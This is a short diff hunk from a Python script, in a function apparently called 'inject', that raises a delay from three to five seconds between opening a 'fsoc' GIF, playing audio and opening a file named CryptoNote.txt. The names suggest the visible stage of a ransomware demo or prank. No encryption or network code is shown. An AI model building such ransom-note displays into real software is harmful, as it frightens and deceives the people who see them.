@@ -64,7 +64,7 @@ def inject(filename):
 init()
 pre=subprocess.Popen(['start', 'fsoc.gif'], shell=True)
 process=subprocess.Popen(['start', 'sample.mp3'], shell=True)
-time.sleep(3)
+time.sleep(5)
 
 subprocess.Popen(['start', 'CryptoNote.txt'], shell=True)
 
